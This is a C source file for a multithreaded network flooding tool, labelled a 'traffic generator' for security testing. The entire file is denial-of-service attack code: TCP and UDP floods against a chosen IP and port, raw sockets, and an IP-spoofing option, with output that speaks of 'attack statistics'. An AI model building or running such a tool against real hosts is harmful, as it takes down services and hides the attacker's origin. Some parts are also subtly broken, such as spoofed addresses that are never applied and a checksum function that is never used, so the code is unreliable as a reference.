/******************************************************************************
* Network Traffic Generator Tool - Cybersecurity Utility
* 
* Description: This tool generates high volumes of network traffic to specified
* IP addresses and ports for testing network resilience and security measures.
*
* Features:
* - TCP/UDP flood capabilities
* - Customizable packet size and rate
* - Multi-threaded for high performance
* - IP spoofing options
* - Detailed statistics reporting
*
* Usage: ./traffic_generator <target_ip> <port> [options]
*
* Author: Ian Carter Kulani
* Version: 12.0
* License: None
******************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>

#define DEFAULT_THREADS 4
#define DEFAULT_PACKET_SIZE 1024
#define MAX_PACKET_SIZE 65507
#define MAX_THREADS 256
#define STATS_INTERVAL 5

typedef enum {
    PROTO_TCP,
    PROTO_UDP,
    PROTO_ICMP
} Protocol;

typedef struct {
    char target_ip[INET_ADDRSTRLEN];
    int target_port;
    Protocol protocol;
    int packet_size;
    int threads_count;
    int duration;
    int spoof_ip;
    int running;
    unsigned long total_packets;
    unsigned long total_bytes;
    struct timeval start_time;
} AttackConfig;

typedef struct {
    int thread_id;
    AttackConfig *config;
    unsigned long packets_sent;
    unsigned long bytes_sent;
} ThreadData;

// Global configuration
AttackConfig config;

// Function prototypes
void print_banner();
void print_usage();
void parse_args(int argc, char *argv[]);
void validate_config();
void init_config();
void start_attack();
void *attack_thread(void *arg);
void send_tcp_packet(int thread_id, struct sockaddr_in *target_addr);
void send_udp_packet(int thread_id, struct sockaddr_in *target_addr);
void print_stats();
void signal_handler(int sig);
unsigned short checksum(unsigned short *ptr, int nbytes);
void randomize_packet(char *packet, int size);
void print_elapsed_time();

int main(int argc, char *argv[]) {
    print_banner();
    init_config();
    parse_args(argc, argv);
    validate_config();

    printf("[+] Starting attack on %s:%d using %s\n", 
           config.target_ip, config.target_port,
           config.protocol == PROTO_TCP ? "TCP" : "UDP");
    printf("[+] Threads: %d, Packet size: %d bytes\n", 
           config.threads_count, config.packet_size);
    if (config.duration > 0) {
        printf("[+] Duration: %d seconds\n", config.duration);
    }

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    start_attack();

    return 0;
}

void print_banner() {
    printf("\n");
    printf("  ____ _   _ _____ _____ _   _ _______ ______ _____  \n");
    printf(" / ___| \\ | |_   _| ____| \\ | |__   __|  ____|  __ \\ \n");
    printf("| |   |  \\| | | | |  _||  \\| |  | |  | |__  | |__) |\n");
    printf("| |___| |\\  | | | | |___| |\\  |  | |  |  __| |  _  / \n");
    printf(" \\____|_| \\_| |_| |_____|_| \\_|  |_|  |_|____|_| \\_\\ \n");
    printf("\n");
    printf("Network Traffic Generator - Cybersecurity Testing Tool\n");
    printf("Version 1.0 - For educational purposes only\n\n");
}

void print_usage() {
    printf("Usage: ./traffic_generator <target_ip> <port> [options]\n\n");
    printf("Options:\n");
    printf("  -p <protocol>     Protocol to use (tcp, udp, icmp) [default: tcp]\n");
    printf("  -t <threads>      Number of threads to use [default: %d]\n", DEFAULT_THREADS);
    printf("  -s <size>         Packet size in bytes [default: %d]\n", DEFAULT_PACKET_SIZE);
    printf("  -d <duration>     Attack duration in seconds (0 for unlimited)\n");
    printf("  --spoof           Enable IP spoofing (random source IPs)\n");
    printf("  -h                Show this help message\n\n");
    printf("Example:\n");
    printf("  ./traffic_generator 192.168.1.100 80 -p udp -t 10 -s 512 -d 60\n");
    exit(0);
}

void init_config() {
    memset(&config, 0, sizeof(config));
    config.protocol = PROTO_TCP;
    config.packet_size = DEFAULT_PACKET_SIZE;
    config.threads_count = DEFAULT_THREADS;
    config.duration = 0;
    config.spoof_ip = 0;
    config.running = 1;
    config.total_packets = 0;
    config.total_bytes = 0;
    gettimeofday(&config.start_time, NULL);
}

void parse_args(int argc, char *argv[]) {
    if (argc < 3) {
        print_usage();
    }

    // Parse target IP and port
    strncpy(config.target_ip, argv[1], INET_ADDRSTRLEN - 1);
    config.target_port = atoi(argv[2]);

    // Parse options
    for (int i = 3; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "Error: Missing protocol argument\n");
                print_usage();
            }
            if (strcmp(argv[i + 1], "tcp") == 0) {
                config.protocol = PROTO_TCP;
            } else if (strcmp(argv[i + 1], "udp") == 0) {
                config.protocol = PROTO_UDP;
            } else if (strcmp(argv[i + 1], "icmp") == 0) {
                config.protocol = PROTO_ICMP;
            } else {
                fprintf(stderr, "Error: Invalid protocol '%s'\n", argv[i + 1]);
                exit(1);
            }
            i++;
        } else if (strcmp(argv[i], "-t") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "Error: Missing thread count argument\n");
                print_usage();
            }
            config.threads_count = atoi(argv[i + 1]);
            if (config.threads_count <= 0 || config.threads_count > MAX_THREADS) {
                fprintf(stderr, "Error: Invalid thread count (1-%d)\n", MAX_THREADS);
                exit(1);
            }
            i++;
        } else if (strcmp(argv[i], "-s") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "Error: Missing packet size argument\n");
                print_usage();
            }
            config.packet_size = atoi(argv[i + 1]);
            if (config.packet_size <= 0 || config.packet_size > MAX_PACKET_SIZE) {
                fprintf(stderr, "Error: Invalid packet size (1-%d)\n", MAX_PACKET_SIZE);
                exit(1);
            }
            i++;
        } else if (strcmp(argv[i], "-d") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "Error: Missing duration argument\n");
                print_usage();
            }
            config.duration = atoi(argv[i + 1]);
            if (config.duration < 0) {
                fprintf(stderr, "Error: Duration must be >= 0\n");
                exit(1);
            }
            i++;
        } else if (strcmp(argv[i], "--spoof") == 0) {
            config.spoof_ip = 1;
        } else if (strcmp(argv[i], "-h") == 0) {
            print_usage();
        } else {
            fprintf(stderr, "Error: Unknown option '%s'\n", argv[i]);
            print_usage();
        }
    }
}

void validate_config() {
    struct in_addr addr;
    if (inet_pton(AF_INET, config.target_ip, &addr) != 1) {
        fprintf(stderr, "Error: Invalid target IP address\n");
        exit(1);
    }

    if (config.target_port <= 0 || config.target_port > 65535) {
        fprintf(stderr, "Error: Invalid target port (1-65535)\n");
        exit(1);
    }

    if (config.protocol == PROTO_ICMP) {
        printf("Warning: ICMP support is not yet implemented, defaulting to UDP\n");
        config.protocol = PROTO_UDP;
    }
}

void start_attack() {
    pthread_t threads[MAX_THREADS];
    ThreadData thread_data[MAX_THREADS];
    struct sockaddr_in target_addr;
    time_t start_time = time(NULL);
    time_t last_stats_time = start_time;
    int i;

    // Initialize target address structure
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config.target_port);
    if (inet_pton(AF_INET, config.target_ip, &target_addr.sin_addr) != 1) {
        perror("inet_pton");
        exit(1);
    }

    // Create threads
    for (i = 0; i < config.threads_count; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].config = &config;
        thread_data[i].packets_sent = 0;
        thread_data[i].bytes_sent = 0;

        if (pthread_create(&threads[i], NULL, attack_thread, &thread_data[i]) != 0) {
            perror("pthread_create");
            exit(1);
        }
    }

    // Main loop for stats and duration control
    while (config.running) {
        sleep(1);

        // Update total stats
        config.total_packets = 0;
        config.total_bytes = 0;
        for (i = 0; i < config.threads_count; i++) {
            config.total_packets += thread_data[i].packets_sent;
            config.total_bytes += thread_data[i].bytes_sent;
        }

        // Print stats periodically
        time_t now = time(NULL);
        if (now - last_stats_time >= STATS_INTERVAL) {
            print_stats();
            last_stats_time = now;
        }

        // Check duration
        if (config.duration > 0 && (now - start_time) >= config.duration) {
            printf("[+] Attack duration reached, stopping...\n");
            config.running = 0;
        }
    }

    // Wait for threads to finish
    for (i = 0; i < config.threads_count; i++) {
        pthread_join(threads[i], NULL);
    }

    // Final stats
    printf("\n[+] Attack finished\n");
    print_stats();
    print_elapsed_time();
}

void *attack_thread(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    struct sockaddr_in target_addr;

    // Initialize target address structure
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(data->config->target_port);
    if (inet_pton(AF_INET, data->config->target_ip, &target_addr.sin_addr) != 1) {
        perror("inet_pton");
        pthread_exit(NULL);
    }

    // Attack loop
    while (data->config->running) {
        switch (data->config->protocol) {
            case PROTO_TCP:
                send_tcp_packet(data->thread_id, &target_addr);
                break;
            case PROTO_UDP:
                send_udp_packet(data->thread_id, &target_addr);
                break;
            default:
                break;
        }
        data->packets_sent++;
        data->bytes_sent += data->config->packet_size;
    }

    pthread_exit(NULL);
}

void send_tcp_packet(int thread_id, struct sockaddr_in *target_addr) {
    int sockfd;
    char packet[config.packet_size];
    struct sockaddr_in src_addr;
    
    // Create raw socket
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("socket");
        return;
    }

    // Set IP_HDRINCL option to include our own IP header
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sockfd);
        return;
    }

    // Randomize packet content
    randomize_packet(packet, config.packet_size);

    // Spoof source IP if enabled
    if (config.spoof_ip) {
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(rand() % 65535);
        src_addr.sin_addr.s_addr = rand();
    } else {
        // Use our real IP
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(rand() % 65535);
        src_addr.sin_addr.s_addr = INADDR_ANY;
    }

    // Send packet
    if (sendto(sockfd, packet, config.packet_size, 0, 
               (struct sockaddr *)target_addr, sizeof(*target_addr)) < 0) {
        perror("sendto");
    }

    close(sockfd);
}

void send_udp_packet(int thread_id, struct sockaddr_in *target_addr) {
    int sockfd;
    char packet[config.packet_size];
    struct sockaddr_in src_addr;
    
    // Create socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket");
        return;
    }

    // Randomize packet content
    randomize_packet(packet, config.packet_size);

    // Spoof source IP if enabled (requires raw sockets)
    if (config.spoof_ip) {
        close(sockfd);
        if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
            perror("socket raw");
            return;
        }

        int one = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            perror("setsockopt");
            close(sockfd);
            return;
        }

        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(rand() % 65535);
        src_addr.sin_addr.s_addr = rand();
    } else {
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(rand() % 65535);
        src_addr.sin_addr.s_addr = INADDR_ANY;
    }

    // Bind socket if not spoofing
    if (!config.spoof_ip) {
        if (bind(sockfd, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0) {
            perror("bind");
            close(sockfd);
            return;
        }
    }

    // Send packet
    if (sendto(sockfd, packet, config.packet_size, 0, 
               (struct sockaddr *)target_addr, sizeof(*target_addr)) < 0) {
        perror("sendto");
    }

    close(sockfd);
}

void randomize_packet(char *packet, int size) {
    for (int i = 0; i < size; i++) {
        packet[i] = rand() % 256;
    }
}

void print_stats() {
    struct timeval now;
    gettimeofday(&now, NULL);
    
    double elapsed = (now.tv_sec - config.start_time.tv_sec) + 
                   (now.tv_usec - config.start_time.tv_usec) / 1000000.0;
    
    double mb_sent = config.total_bytes / (1024.0 * 1024.0);
    double mbps = mb_sent / elapsed;
    double pps = config.total_packets / elapsed;
    
    printf("\n[+] Attack Statistics\n");
    printf("    Elapsed time: %.2f seconds\n", elapsed);
    printf("    Packets sent: %lu\n", config.total_packets);
    printf("    Bytes sent: %lu (%.2f MB)\n", config.total_bytes, mb_sent);
    printf("    Average rate: %.2f packets/sec\n", pps);
    printf("    Bandwidth: %.2f MB/s\n", mbps);
}

void print_elapsed_time() {
    struct timeval now;
    gettimeofday(&now, NULL);
    
    double elapsed = (now.tv_sec - config.start_time.tv_sec) + 
                   (now.tv_usec - config.start_time.tv_usec) / 1000000.0;
    
    printf("    Total attack duration: %.2f seconds\n", elapsed);
}

void signal_handler(int sig) {
    printf("\n[!] Received signal %d, stopping attack...\n", sig);
    config.running = 0;
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return answer;
}